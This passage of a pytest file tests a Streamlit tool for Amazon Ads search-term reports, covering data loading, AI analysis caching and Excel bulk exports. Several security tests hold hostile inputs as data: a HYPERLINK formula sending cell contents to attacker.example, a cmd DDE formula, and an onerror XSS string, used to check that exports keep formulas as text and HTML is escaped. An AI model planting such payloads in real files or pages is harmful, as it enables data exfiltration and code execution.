    def test_custom_range_survives_an_accounts_read_failure(self, monkeypatch):
        fake = _FakeRest([_profile_row()], [_completed_job_row()], search_term_rows=_SEARCH_TERM_ROWS)
        app = _picker_app(monkeypatch, fake)
        app.run()
        app.selectbox(key="str_src_period").set_value("custom").run()
        yesterday = _profile_today() - timedelta(days=1)
        picked = (yesterday - timedelta(days=9), yesterday)
        app.date_input(key="str_src_custom_range").set_value(picked).run()
        loaded = app.session_state["test_result_str"]
        assert fake.search_term_reads[-1] == 10

        fake.profiles_down = True
        app.run()
        fake.profiles_down = False
        app.run()
        assert not app.exception
        assert tuple(app.date_input(key="str_src_custom_range").value) == picked
        assert app.session_state["test_result_str"] == loaded

    def test_a_range_not_in_memory_is_read_at_the_newest_sync_and_labeled_with_it(self, monkeypatch):
        fake = _FakeRest([_profile_row()], [_completed_job_row()], search_term_rows=_SEARCH_TERM_ROWS)
        app = _picker_app(monkeypatch, fake)
        app.run()

        newest_sync = datetime.now(timezone.utc)
        fake.search_term_rows = _SEARCH_TERM_ROWS[:2]
        fake.profile_rows = [_profile_row(last_success_at=newest_sync.isoformat())]
        app.run()
        assert picker.NEWER_DATA_MESSAGE in _markdown(app)

        # The table only holds the newest rows, so a range not read before can't come back at the old sync.
        app.selectbox(key="str_src_period").set_value("14").run()
        assert not app.exception
        assert app.session_state["test_result_str"][1] == 2
        assert app.session_state["str_src_pinned"]["111"].last_success_at == newest_sync
        # AppTest keeps the status fragment's output from the run st.rerun stopped until the next run.
        app.run()
        assert picker.NEWER_DATA_MESSAGE not in _markdown(app)

    def test_evicted_rows_come_back_at_the_newest_sync_with_a_new_signature(self, monkeypatch):
        fake = _FakeRest([_profile_row()], [_completed_job_row()], search_term_rows=_SEARCH_TERM_ROWS)
        app = _picker_app(monkeypatch, fake)
        app.run()
        first_signature = app.session_state["test_result_str"][4]

        fake.search_term_rows = _SEARCH_TERM_ROWS[:2]
        fake.profile_rows = [_profile_row(last_success_at=datetime.now(timezone.utc).isoformat())]
        app.run()
        assert app.session_state["test_result_str"][4] == first_signature

        # Four other loads push this one out of the session; the same period then has to be read again.
        app.session_state["str_src_loaded"] = {}
        app.run()
        assert not app.exception
        _, row_count, _, _, signature = app.session_state["test_result_str"]
        assert row_count == 2
        assert signature != first_signature
        app.run()
        assert picker.NEWER_DATA_MESSAGE not in _markdown(app)

    def test_loaded_rows_stay_put_when_the_worker_rewrites_those_days(self, monkeypatch):
        fake = _FakeRest([_profile_row()], [_completed_job_row()], search_term_rows=_SEARCH_TERM_ROWS)
        app = _picker_app(monkeypatch, fake)
        app.run()
        assert app.session_state["test_result_str"][1] == 4

        # The script clears st.cache_data on every run, as an eviction or the 6 h expiry would.
        fake.search_term_rows = _SEARCH_TERM_ROWS[:2]
        app.run()
        assert app.session_state["test_result_str"][1] == 4

        fake.profile_rows = [_profile_row(last_success_at=datetime.now(timezone.utc).isoformat())]
        app.run()
        app.button(key="str_src_load_newer").click().run()
        assert not app.exception
        assert app.session_state["test_result_str"][1] == 2


_CONSOLE_2026_CSV = (
    "\ufeffBudget currency,Date range,Advertiser account ID,Advertiser account name,Campaign ID,Campaign name,"
    "Ad group ID,Ad group name,Search term,Impressions,Clicks,Total cost,Purchases,Sales,Units sold\n"
    "USD,\"Aug 18, 2026 - Aug 24, 2026\",A-US,Marca Norte US,11,Camp US,21,AG US,dog bed,900,12,8.50,1,30.00,1\n"
    "USD,\"Aug 18, 2026 - Aug 24, 2026\",A-US,Marca Norte US,11,Camp US,21,AG US,cat bed,700,9,6.00,0,0,0\n"
    "USD,\"Aug 18, 2026 - Aug 24, 2026\",A-US,Marca Norte US,11,Camp US,21,AG US,pet bed,500,4,2.25,0,0,0\n"
    "MXN,\"Aug 18, 2026 - Aug 24, 2026\",A-MX,Marca Norte MX,12,Camp MX,22,AG MX,cama perro,300,3,40.00,1,450.00,1\n"
).encode("utf-8")


class _UploadedFile:
    name = "Search_term_2026.csv"

    def getvalue(self):
        return _CONSOLE_2026_CSV


class TestManualFileApp:
    def test_file_with_two_accounts_defaults_to_the_bigger_one_and_names_its_currency(self, monkeypatch):
        import streamlit
        monkeypatch.setattr(streamlit, "file_uploader", lambda *args, **kwargs: _UploadedFile())
        app = _picker_app(monkeypatch, None)
        app.run()
        assert not app.exception
        label, rows, currency, bulk_ready, _ = app.session_state["test_result_str"]
        assert (label, rows, currency, bulk_ready) == ("Marca Norte US · Search_term_2026.csv", 3, "USD", False)
        assert "4 filas · formato nuevo de la consola" in [caption.value for caption in app.caption]
        (account_control,) = app.get("button_group")
        assert account_control.key == "str_src_file_account"
        assert "«Budget currency»" in _markdown(app)

        account_control.set_value("A-MX").run()
        assert app.session_state["test_result_str"][1:3] == (1, "MXN")

    @staticmethod
    def _file_analysis_app(monkeypatch, currency_code):
        import streamlit
        csv_bytes = (
            "Budget currency,Date range,Advertiser account ID,Advertiser account name,Campaign ID,Campaign name,"
            "Ad group ID,Ad group name,Search term,Impressions,Clicks,Total cost,Purchases,Sales,Units sold\n"
            f"{currency_code},\"Aug 18, 2026 - Sep 14, 2026\",A-1,Marca Norte,11,Camp,21,AG,cheap toy box,900,40,"
            "25.00,0,0,0\n"
            f"{currency_code},\"Aug 18, 2026 - Sep 14, 2026\",A-1,Marca Norte,11,Camp,21,AG,luna pajamas,800,30,"
            "10.00,6,150.00,6\n"
        ).encode("utf-8")
        uploaded = type("Uploaded", (), {"name": "Search_term_file.csv", "getvalue": lambda self: csv_bytes})()
        monkeypatch.setattr(streamlit, "file_uploader", lambda *args, **kwargs: uploaded)
        monkeypatch.setattr(ads_account_picker, "_load_vehicles", lambda: [])
        asked = []
        monkeypatch.setattr(ai_client, "ask", lambda **call: asked.append(call) or {
            "structured_output": {"negativos": [], "harvest": [], "campanas": [],
                                  "synthesis": {"situation": "Situación del archivo", "week_actions": [],
                                                "mid_term": [], "risks": []}},
            "session_id": "file-session"})
        with ai_runtime._lock:
            ai_runtime._registry.clear()
        monkeypatch.setattr(picker, "_open_rest", lambda: None)
        app = AppTest.from_string("""
import streamlit as st
from modules.pages import search_term_report
search_term_report.render()
""", default_timeout=90)
        return app, asked

    @staticmethod
    def _run_until_analysis(app):
        import time
        app.run()
        for _ in range(20):
            if "Situación del archivo" in _markdown(app):
                break
            time.sleep(0.2)
            app.run()

    def test_a_file_analysis_stays_in_memory_and_new_parameters_hide_it_until_asked(self, monkeypatch):
        app, asked = self._file_analysis_app(monkeypatch, "USD")
        self._run_until_analysis(app)

        assert not app.exception
        assert "Situación del archivo" in _markdown(app)
        assert len(asked) == 1

        app.slider(key="neg_target_acos").set_value(45).run()
        assert "Situación del archivo" not in _markdown(app)
        assert "Análisis pendiente" in _markdown(app)
        assert len(asked) == 1
        with ai_runtime._lock:
            ai_runtime._registry.clear()

    def test_a_file_analysis_reaches_the_app_chat_and_leaves_it_when_the_parameters_change(self, monkeypatch):
        app, _ = self._file_analysis_app(monkeypatch, "USD")
        self._run_until_analysis(app)

        assert not app.exception
        entry = app.session_state["app_chat_modules"]["str"]
        titles = [doc["title"] for doc in entry.analysis.documents]
        assert entry.state == "current"
        assert titles[-1] == "Search Term Report · Marca Norte · Search_term_file.csv · Lectura de la IA"
        assert "Search Term Report · Marca Norte · Search_term_file.csv · Parámetros" in titles
        reading = entry.analysis.documents[-1]["content"]
        assert "Período: el del archivo subido" in reading and "Situación: Situación del archivo" in reading

        app.slider(key="neg_target_acos").set_value(45).run()
        assert "str" not in app.session_state["app_chat_modules"]
        with ai_runtime._lock:
            ai_runtime._registry.clear()

    def test_a_file_without_prices_waits_for_them_instead_of_spending_an_analysis(self, monkeypatch):
        app, asked = self._file_analysis_app(monkeypatch, "MXN")
        app.run()

        assert not app.exception
        assert asked == []
        assert "Análisis pendiente" in _markdown(app)
        assert any(info.value.startswith("Sin precio del producto") for info in app.info)

        app.number_input(key="neg_precio_MXN").set_value(450.0).run()
        assert asked == []
        app.number_input(key="harv_precio_MXN").set_value(450.0)
        self._run_until_analysis(app)

        assert "Situación del archivo" in _markdown(app)
        assert len(asked) == 1
        with ai_runtime._lock:
            ai_runtime._registry.clear()


class TestSearchTermReportWithApiSource:
    @pytest.fixture(autouse=True)
    def _offline_ai(self, monkeypatch):
        def _provider_offline(**kwargs):
            raise ai_client.ProviderDown("tests run offline")
        monkeypatch.setattr(ai_client, "ask", _provider_offline)
        monkeypatch.setattr(ads_account_picker, "_load_vehicles", lambda: [])
        with ai_runtime._lock:
            ai_runtime._registry.clear()
        yield
        with ai_runtime._lock:
            ai_runtime._registry.clear()

    @staticmethod
    def _page_app(monkeypatch, fake) -> AppTest:
        monkeypatch.setattr(picker, "_open_rest", lambda: fake)
        return AppTest.from_string("""
import streamlit as st
st.cache_data.clear()
from modules.pages import search_term_report
search_term_report.render()
""", default_timeout=90)

    @staticmethod
    def _download(app, label):
        (button,) = [element for element in app.get("download_button") if element.proto.label == label]
        return button

    @staticmethod
    def _negative_actions(app):
        (candidates,) = [frame.value for frame in app.dataframe if "Acción" in getattr(frame.value, "columns", ())]
        return dict(zip(candidates["Search Term"], candidates["Acción"]))

    def test_applied_brand_terms_say_how_many_search_terms_they_mark_as_brand(self, monkeypatch):
        fake = _FakeRest([_profile_row(currency_code="USD", country_code="US")], [_completed_job_row()],
                         search_term_rows=_SEARCH_TERM_ROWS)
        app = self._page_app(monkeypatch, fake)
        app.run()
        assert not [caption.value for caption in app.caption if caption.value.startswith("Marca aplicada")]

        app.text_input(key="str_brand_terms").input("Luna, test").run()
        assert ("Marca aplicada (luna, test): 1 de 4 términos la contienen · $10.00 de gasto (17.9%)."
                in [caption.value for caption in app.caption])

        app.text_input(key="str_brand_terms").input("test").run()
        assert ("Marca aplicada (test): ningún término de búsqueda la contiene."
                in [caption.value for caption in app.caption])

    def test_page_runs_on_api_data_with_currency_and_negatives_bulk(self, monkeypatch):
        app = self._page_app(monkeypatch, _FakeRest([_profile_row()], [_completed_job_row()],
                                                     search_term_rows=_SEARCH_TERM_ROWS))
        app.run()
        assert not app.exception
        assert "MX$56.00" in _markdown(app)  # total spend 25 + 20 + 10 + 1
        assert AD_GROUP_STATE_UNVERIFIED_NOTE in [caption.value for caption in app.caption]

        # A peso price is not a dollar price: until the AM types one, Rule 3 is off and the bulk cannot download.
        assert app.number_input(key="neg_precio_MXN").value is None
        assert any("Ingresá el precio promedio del producto en MXN" in warning.value for warning in app.warning)
        assert self._download(app, "Descargar bulk de negativos (.xlsx)").proto.disabled
        # Without Rule 3 its 20 spend is only a few clicks to review, hidden by the default Alta/Media filter.
        assert "b0abcdefgh" not in self._negative_actions(app)

        app.number_input(key="neg_precio_MXN").set_value(30.0).run()
        assert not app.exception
        assert not self._download(app, "Descargar bulk de negativos (.xlsx)").proto.disabled
        assert self._negative_actions(app)["b0abcdefgh"] == "Negativo"
        assert "Quedaron afuera del bulk (1)" in _markdown(app)

    def test_data_without_orders_uses_a_reference_cvr_and_tells_the_ai_the_measured_one(self, monkeypatch):
        rows = [_term_row("cheap toy box", match_type="BROAD", clicks=40, orders=0, cost=25.0, sales=0.0,
                          keyword_text="toy box"),
                _term_row("sleep sack", match_type="PHRASE", clicks=2, orders=0, cost=1.0, sales=0.0,
                          keyword_text="sleep sack")]
        payloads = []
        build_agent_call = search_term_report.build_agent_call
        monkeypatch.setattr(search_term_report, "build_agent_call",
                            lambda slug, data: payloads.append(data) or build_agent_call(slug, data))
        app = self._page_app(monkeypatch, _FakeRest([_profile_row(currency_code="USD", country_code="US")],
                                                     [_completed_job_row()], search_term_rows=rows))
        app.run()
        assert not app.exception
        assert any("CVR de referencia" in info.value and "20 clicks" in info.value for info in app.info)
        assert payloads and (payloads[-1].cvr, payloads[-1].umbral_clicks) == (0.0, 20)

    def test_page_renders_with_ai_analysis_disabled(self, monkeypatch):
        import ai.config as ai_config
        monkeypatch.setattr(ai_config, "AI_ENABLED", False)
        app = self._page_app(monkeypatch, _FakeRest([_profile_row(currency_code="USD", country_code="US")],
                                                     [_completed_job_row()], search_term_rows=_SEARCH_TERM_ROWS))
        app.run()
        assert not app.exception

    def test_typed_inputs_survive_a_period_without_searches(self, monkeypatch):
        from streamlit.elements.lib import policies
        from streamlit.runtime.state import get_session_state
        default_and_session_value = []

        def record_default_plus_session_value(default_value, key, writes_allowed=True):
            # Streamlit shows an on-page warning for exactly this pair outside tests.
            if key is not None and default_value is not None and get_session_state().is_new_state_value(key):
                default_and_session_value.append(key)
        monkeypatch.setattr(policies, "check_session_state_rules", record_default_plus_session_value)

        fake = _FakeRest([_profile_row(currency_code="USD", country_code="US")], [_completed_job_row()],
                         search_term_rows=_SEARCH_TERM_ROWS)
        fake.empty_spans = {7}
        app = self._page_app(monkeypatch, fake)
        app.run()
        app.selectbox(key="str_src_period").set_value("30").run()
        app.text_input(key="str_brand_terms").input("acme, acm").run()
        app.number_input(key="neg_precio").set_value(55.0).run()
        app.slider(key="neg_target_acos").set_value(45).run()
        app.multiselect(key="neg_prio_filter").set_value(["Alta"]).run()

        app.selectbox(key="str_src_period").set_value("7").run()
        assert [info.value for info in app.info][-1].startswith("Esta cuenta no tuvo búsquedas con clicks")
        app.selectbox(key="str_src_period").set_value("30").run()
        assert not app.exception

        price = app.number_input(key="neg_precio")
        assert (app.text_input(key="str_brand_terms").value, price.value, app.slider(key="neg_target_acos").value,
                app.multiselect(key="neg_prio_filter").value) == ("acme, acm", 55.0, 45, ["Alta"])
        # Written again in the run that draws them, so the browser shows the kept values and not the defaults.
        assert price.proto.set_value and price.proto.value == 55.0
        assert default_and_session_value == []

    @staticmethod
    def _analysis_input(fake, profile_row, params, lang="es"):
        """What M2 sends the AI for the default 30 days, built the way the analysis worker builds it."""
        option = ProfileOption.from_row(profile_row)
        start, end = canonical_analysis_window(option.data_from, option.data_through)
        frame = ReportProvider(fake).search_terms(option, start, end).frame
        cols = detect_columns(frame)
        add_metric_columns(frame, cols)
        built = build_analysis_input(frame, cols, params, currency_code=option.currency_code, lang=lang)
        return build_agent_call("str", built.data), built, (start, end)

    @staticmethod
    def _stored_row(analysis_id, call, built, window, situation, *, params, status="done"):
        return {"id": analysis_id, "module": "str", "subject_id": "111", "window_start": window[0].isoformat(),
                "window_end": window[1].isoformat(), "lang": "es", "params": params.as_dict(),
                "params_digest": params.digest, "input_digest": call.input_digest,
                "agent_version": call.agent_version, "status": status, "trigger": "scheduled",
                "requested_by": "scheduler", "job_id": 400 + analysis_id, "source_last_success_at": None,
                "negative_records": built.negative_records, "harvest_records": built.harvest_records,
                "result": {"negativos": [], "harvest": [], "campanas": [],
                           "synthesis": {"situation": situation, "week_actions": ["Acción guardada"],
                                         "mid_term": [], "risks": []}},
                "model": "claude-opus-5", "duration_ms": 95000, "created_at": "2026-09-15T10:00:00+00:00",
                "finished_at": f"2026-09-15T10:0{analysis_id % 10}:00+00:00", "session_id": "sess"}

    def test_the_stored_analysis_of_these_data_is_shown_without_calling_the_ai(self, monkeypatch):
        profile = _profile_row(currency_code="USD", country_code="US")
        fake = _FakeRest([profile], [_completed_job_row()], search_term_rows=_SEARCH_TERM_ROWS)
        call, built, window = self._analysis_input(fake, profile, StrAnalysisParams.defaults("USD"))
        fake.analysis_rows = [self._stored_row(7, call, built, window, "Situación guardada",
                                               params=StrAnalysisParams.defaults("USD"))]
        app = self._page_app(monkeypatch, fake)
        app.run()

        assert not app.exception
        assert "Situación guardada" in _markdown(app)
        assert "Análisis IA pendiente" not in _markdown(app)
        assert not [name for name, _ in fake.rpc_calls if name == "request_ai_analysis"]

    def test_an_account_without_a_price_shows_its_stored_analysis_and_what_it_leaves_out(self, monkeypatch):
        profile = _profile_row()
        fake = _FakeRest([profile], [_completed_job_row()], search_term_rows=_SEARCH_TERM_ROWS)
        no_prices = StrAnalysisParams.defaults("MXN")
        call, built, window = self._analysis_input(fake, profile, no_prices)
        fake.analysis_rows = [self._stored_row(7, call, built, window, "Situación sin precio", params=no_prices)]
        app = self._page_app(monkeypatch, fake)
        app.run()

        assert not app.exception
        assert app.number_input(key="neg_precio_MXN").value is None
        assert "Situación sin precio" in _markdown(app)
        assert any(info.value.startswith("Sin precio del producto: este análisis no evalúa la Regla 3")
                   for info in app.info)
        assert "Análisis IA pendiente" not in _markdown(app)

    def test_new_parameters_hide_the_stored_analysis_and_generate_only_on_request(self, monkeypatch):
        profile = _profile_row(currency_code="USD", country_code="US")
        fake = _FakeRest([profile], [_completed_job_row()], search_term_rows=_SEARCH_TERM_ROWS)
        defaults = StrAnalysisParams.defaults("USD")
        call, built, window = self._analysis_input(fake, profile, defaults)
        fake.analysis_rows = [self._stored_row(7, call, built, window, "Situación guardada", params=defaults)]
        app = self._page_app(monkeypatch, fake)
        app.run()
        app.slider(key="neg_target_acos").set_value(45).run()

        assert not app.exception
        assert "Situación guardada" not in _markdown(app)
        assert "No hay un análisis con estos parámetros" in _markdown(app)
        assert not [name for name, _ in fake.rpc_calls if name == "request_ai_analysis"]

        app.button(key="str_ai_request").click().run()
        assert not app.exception
        assert [toast.value for toast in app.toast] == ["Análisis IA pedido: se genera en unos minutos."]
        new_params = StrAnalysisParams(45, defaults.price, defaults.harvest_target_acos, defaults.harvest_price,
                                       defaults.harvest_min_clicks, ())
        new_call, _, _ = self._analysis_input(fake, profile, new_params)
        calls = dict(fake.rpc_calls)
        assert calls["save_ai_analysis_settings"]["p_params"] == new_params.as_dict()
        request = calls["request_ai_analysis"]
        assert (request["p_input_digest"], request["p_window_start"], request["p_window_end"], request["p_lang"]) == (
            new_call.input_digest, window[0].isoformat(), window[1].isoformat(), "es")

    def test_an_analysis_being_generated_shows_progress_and_never_an_older_result(self, monkeypatch):
        profile = _profile_row(currency_code="USD", country_code="US")
        fake = _FakeRest([profile], [_completed_job_row()], search_term_rows=_SEARCH_TERM_ROWS)
        call, built, window = self._analysis_input(fake, profile, StrAnalysisParams.defaults("USD"))
        older = self._stored_row(3, call, built, window, "Situación de datos viejos",
                                 params=StrAnalysisParams.defaults("USD"))
        fake.analysis_rows = [dict(older, input_digest="older-data")]
        fake.job_rows.append(dict(_completed_job_row(), id=9, job_kind="ai_str_analysis", status="running",
                                  params={"input_digest": call.input_digest}))
        app = self._page_app(monkeypatch, fake)
        app.run()

        assert not app.exception
        assert [status.label for status in app.get("status")][0].startswith("Generando el análisis IA")
        assert "Situación de datos viejos" not in _markdown(app)

    def test_the_account_parameters_fill_the_inputs_when_the_account_opens(self, monkeypatch):
        fake = _FakeRest([_profile_row()], [_completed_job_row()], search_term_rows=_SEARCH_TERM_ROWS)
        fake.settings_rows = [{"module": "str", "subject_id": "111", "updated_by": "ana",
                               "updated_at": "2026-09-15T10:00:00+00:00",
                               "params": {"target_acos": 40, "price": 250.0, "harvest_target_acos": 35,
                                          "harvest_price": 260.0, "harvest_min_clicks": 20,
                                          "brand_terms": ["luna", "acme"]}}]
        app = self._page_app(monkeypatch, fake)
        app.run()

        assert not app.exception
        assert (app.slider(key="neg_target_acos").value, app.number_input(key="neg_precio_MXN").value,
                app.slider(key="harv_target_acos").value, app.number_input(key="harv_precio_MXN").value,
                app.number_input(key="harv_min_clicks").value, app.text_input(key="str_brand_terms").value) == (
            40, 250.0, 35, 260.0, 20, "acme, luna")

    def test_the_chat_reads_the_stored_analysis_and_the_earlier_ones(self, monkeypatch):
        profile = _profile_row(currency_code="USD", country_code="US")
        fake = _FakeRest([profile], [_completed_job_row()], search_term_rows=_SEARCH_TERM_ROWS)
        defaults = StrAnalysisParams.defaults("USD")
        call, built, window = self._analysis_input(fake, profile, defaults)
        current = self._stored_row(8, call, built, window, "Situación de hoy", params=defaults)
        earlier = dict(self._stored_row(5, call, built, window, "Situación de ayer", params=defaults),
                       input_digest="yesterday")
        fake.analysis_rows = [current, earlier]
        app = self._page_app(monkeypatch, fake)
        app.run()

        assert not app.exception
        shared = app.session_state["app_chat_modules"]["str"].analysis
        assert [doc["title"] for doc in shared.documents] == [
            "Search Term Report · Luna Kids · US · Análisis IA vigente del reporte que el AM está viendo",
            "Search Term Report · Luna Kids · US · Análisis IA anteriores de esta cuenta "
            "(1, del más nuevo al más viejo)"]
        assert "Situación de hoy" in shared.documents[0]["content"]
        assert "Situación de ayer" in shared.documents[1]["content"]
        assert (shared.key, shared.subject, shared.country_code, shared.profile_id) == (
            "str:111:8:5", "Luna Kids · US", "US", "111")

    def test_every_download_keeps_shopper_typed_formulas_as_text(self, monkeypatch):
        import streamlit
        formula_term = '=HYPERLINK("http://attacker.example/?d="&B2,"click")'
        rows = [dict(row, campaign_name="=1+1") for row in (
            _term_row(formula_term, match_type="BROAD", clicks=40, orders=0, cost=25.0, sales=0.0,
                      keyword_text="toy box"),
            _term_row("cheap toy box", match_type="BROAD", clicks=40, orders=0, cost=25.0, sales=0.0,
                      keyword_text="toy box"),
            _term_row("luna pajamas", match_type="EXACT", clicks=10, orders=5, cost=10.0, sales=100.0,
                      keyword_text="luna pajamas"),
        )]
        downloads = {}

        def record_download(label, data=None, **kwargs):
            downloads[label] = data
            return False
        monkeypatch.setattr(streamlit, "download_button", record_download)
        app = self._page_app(monkeypatch, _FakeRest([_profile_row(currency_code="USD", country_code="US")],
                                                     [_completed_job_row()], search_term_rows=rows))
        app.run()
        assert not app.exception
        assert {label.removeprefix("⬇️ ") for label in downloads} == {
            "Descargar STR Analizado (Excel)", "Descargar candidatos a negativo (.xlsx)",
            "Descargar bulk de negativos (.xlsx)", "Descargar candidatos de harvest (.xlsx)",
            "Descargar Performance por Campana (Excel)"}
        for label, data in downloads.items():
            workbook = openpyxl.load_workbook(io.BytesIO(data))
            cells = [cell for sheet in workbook.worksheets for row in sheet.iter_rows() for cell in row]
            assert [cell.coordinate for cell in cells if cell.data_type == "f"] == [], label
            assert any(cell.value == "=1+1" for cell in cells), label

    def test_currency_code_and_campaign_names_reach_the_kpi_cards_escaped(self, monkeypatch):
        rows = [dict(row, campaign_name="<img src=x onerror=alert(1)>") for row in _SEARCH_TERM_ROWS]
        fake = _FakeRest([_profile_row(currency_code="USD", country_code="US")], [_completed_job_row()],
                         search_term_rows=rows)
        real_picker = search_term_report.render_source_picker
        monkeypatch.setattr(search_term_report, "render_source_picker",
                            lambda: dataclasses.replace(real_picker(), currency_code="<b>US</b>"))
        app = self._page_app(monkeypatch, fake)
        app.run()
        assert not app.exception
        cards = [str(element.value) for element in app.markdown if "font-size:1.4rem" in str(element.value)]
        assert not [card for card in cards if "<B>US</B>" in card or "<img" in card]
        assert any("&lt;B&gt;US&lt;/B&gt;" in card for card in cards)
        assert any("&lt;img src=x onerror=alert(1)&gt;" in card for card in cards)

    def test_large_account_draws_capped_tables_and_builds_big_files_on_request(self, monkeypatch):
        # 30,000 terms put the analysis table past pandas Styler's 262,144 cells, as real accounts do.
        rows = [_term_row(f"term {index}", match_type="BROAD", clicks=1 + index % 7, orders=int(index % 11 == 0),
                          cost=round(0.5 + index % 13, 2), sales=25.0 if index % 11 == 0 else 0.0,
                          keyword_text="toy box") for index in range(30_000)]
        app = self._page_app(monkeypatch, _FakeRest([_profile_row(currency_code="USD", country_code="US")],
                                                     [_completed_job_row()], search_term_rows=rows))
        app.run(timeout=300)
        assert not app.exception
        assert "Mostrando 1.000 de 30.000 filas" in " ".join(caption.value for caption in app.caption)
        assert not [element for element in app.get("download_button")
                    if element.proto.label.endswith("Descargar STR Analizado (Excel)")]

        (prepare,) = [button for button in app.button if button.key == "str_dl_prepare"]
        prepare.click().run(timeout=300)
        assert not app.exception
        assert self._download(app, "⬇️ Descargar STR Analizado (Excel)")

    def test_ranking_terms_stay_out_until_released_one_by_one(self, monkeypatch):
        ranking = {"portfolio_id": "987", "portfolio_name": "RANKING - Core"}
        rows = _SEARCH_TERM_ROWS + [
            dict(_term_row("kids pajamas set", match_type="BROAD", clicks=5, orders=0, cost=25.0, sales=0.0,
                           keyword_text="toy box"), **ranking),
            dict(_term_row("toddler pajamas", match_type="BROAD", clicks=5, orders=0, cost=24.0, sales=0.0,
                           keyword_text="toy box"), **ranking),
        ]
        app = self._page_app(monkeypatch, _FakeRest([_profile_row(currency_code="USD", country_code="US")],
                                                     [_completed_job_row()], search_term_rows=rows))
        app.run()
        assert not app.exception
        assert "Quedaron afuera del bulk (3)" in _markdown(app)  # the ASIN term and both RANKING terms

        app.session_state[RELEASED_RANKING_KEY] = frozenset({("3001", "4001", "kids pajamas set", "Negative Exact")})
        app.run()
        assert not app.exception
        assert "Quedaron afuera del bulk (2)" in _markdown(app)
        assert app.session_state[RELEASED_RANKING_KEY] == {("3001", "4001", "kids pajamas set", "Negative Exact")}


class TestSearchTermReportHelpers:
    def test_prepared_file_survives_a_rerun_that_interrupts_the_spinner(self, monkeypatch):
        class RerunRequested(Exception):
            pass

        class InterruptedSpinner:
            def __enter__(self):
                return self

            def __exit__(self, *exc_info):
                # Streamlit stops a run for a newer widget event at its next st call, here the spinner's exit.
                raise RerunRequested

        fake_st = type("FakeStreamlit", (), {})()
        fake_st.session_state = {}
        fake_st.button = lambda *args, **kwargs: True
        fake_st.caption = lambda *args, **kwargs: None
        fake_st.spinner = lambda *args, **kwargs: InterruptedSpinner()
        fake_st.download_button = lambda *args, **kwargs: None
        monkeypatch.setattr(search_term_report, "st", fake_st)

        with pytest.raises(RerunRequested):
            search_term_report._xlsx_download("Descargar", lambda: b"xlsx bytes", file_name="big.xlsx", key="big_dl",
                                              row_count=search_term_report.EAGER_EXPORT_ROW_LIMIT + 1,
                                              fingerprint=("fingerprint",))
        assert fake_st.session_state["big_dl_prepared"] == (("fingerprint",), b"xlsx bytes")

    def test_harvest_caption_counts_the_rows_the_excel_really_has(self):
        harvest = pd.DataFrame({"Search Term": ["a", "b", "c"], "Ya en Exact": ["", "✅ Ya en Exact", ""]})

        without_existing = search_term_report._harvest_export_rows(harvest, include_existing_exact=False)
        assert list(without_existing["Search Term"]) == ["a", "c"]
        assert len(search_term_report._harvest_export_rows(harvest, include_existing_exact=True)) == 3
        assert search_term_report._drawn_rows_caption(3_000, "por prioridad y órdenes", exported_rows=2_400) == (
            "Mostrando 1.000 de 3.000 filas (por prioridad y órdenes). La descarga en Excel trae 2.400.")
        assert search_term_report._drawn_rows_caption(3_000, "por prioridad y gasto", exported_rows=3_000) == (
            "Mostrando 1.000 de 3.000 filas (por prioridad y gasto). La descarga en Excel trae todas.")

    def test_bulk_file_name_carries_account_currency_and_date(self):
        assert _bulk_file_name("Luna Kids · MX", "MXN", date(2026, 9, 14)) == (
            "negativos_bulk_luna-kids-mx_MXN_2026-09-14.xlsx")
        assert _bulk_file_name("Café Olé · US", "", date(2026, 9, 14)) == (
            "negativos_bulk_cafe-ole-us_SIN-MONEDA_2026-09-14.xlsx")

    def test_amount_unit_keeps_the_dollar_for_usd_and_unknown(self):
        assert (_amount_unit(""), _amount_unit("USD"), _amount_unit("MXN")) == ("$", "$", "MXN")

    def test_candidate_rows_expose_no_hidden_ids(self):
        from core.search_term_negatives import NegativeCandidate
        candidate = NegativeCandidate(search_term="cheap toy box", campaign="C", ad_group="AG", clicks=40,
                                      impressions=1000, spend=25.0, orders=0, acos=None, rule="R2",
                                      action="Negativo", match_type="Negative Exact", priority="Alta",
                                      campaign_id="3001", ad_group_id="4001", origin_match_type="BROAD")
        (row,) = _negative_candidate_rows([candidate])
        assert row["ACoS"] == 0 and row["Acción"] == "Negativo"
        assert not any(column.startswith("_") or column.casefold().endswith("_id") for column in row)
        assert "3001" not in row.values() and "4001" not in row.values()

    @pytest.mark.parametrize("clicks, orders, expected", [
        (82, 5, (5 / 82 * 100, False)),
        (40, 0, (10.0, True)),
        (0, 0, (10.0, True)),
    ])
    def test_rule_two_cvr_falls_back_to_the_reference_only_without_orders(self, clicks, orders, expected):
        assert rule_two_cvr(clicks, orders) == expected

    def test_release_keys_follow_the_shown_boxes_and_keep_the_hidden_ones(self):
        def candidate(term):
            return NegativeCandidate(search_term=term, campaign="C", ad_group="AG", clicks=5, impressions=100,
                                     spend=25.0, orders=0, acos=None, rule="R3", action="Negativo",
                                     match_type="Negative Exact", priority="Alta", campaign_id="3001",
                                     ad_group_id="4001", origin_match_type="BROAD", portfolio="RANKING - Core")
        shown_ticked, shown_unticked, hidden = candidate("a"), candidate("b"), candidate("c")
        shown = [BulkExclusion(shown_ticked, "r", releasable=True), BulkExclusion(shown_unticked, "r", releasable=True)]
        previous = frozenset({negative_key(shown_unticked), negative_key(hidden)})
        assert released_ranking_keys(previous, shown, [True, False]) == {negative_key(shown_ticked),
                                                                          negative_key(hidden)}

    def test_str_analysis_export_stores_formula_looking_terms_as_text(self):
        frame = pd.DataFrame({"Customer Search Term": ["=1+1"], "Campaign Name": ["=cmd|' /C calc'!A0"],
                              "_spend": [1.0], "_sales": [0.0], "_orders": [0], "_estado": ["—"],
                              "_term_type": ["Generic"]})
        workbook = openpyxl.load_workbook(io.BytesIO(_build_str_excel(frame, frame, {"ACoS": "0%"}, ["x"])))
        cells = [cell for sheet in workbook.worksheets for row in sheet.iter_rows() for cell in row]
        assert [cell.coordinate for cell in cells if cell.data_type == "f"] == []
        assert "=1+1" in [cell.value for cell in cells]

    def test_ai_parameters_state_the_account_currency(self):
        data = StrData(cliente="c", brand_terms=[], target_acos=30.0, precio=30.0, cvr=5.0, umbral_clicks=40,
                       umbral_spend=15.0, harvest_target_acos=30.0, harvest_precio=30.0, kpis={}, campanas=[],
                       negativos=[], harvest=[], currency_code="MXN")
        params = build_context(data)[1][0]["content"]
        assert "Moneda de la cuenta: MXN (símbolo MX$)" in params
        assert "Precio promedio: MX$30.00" in params
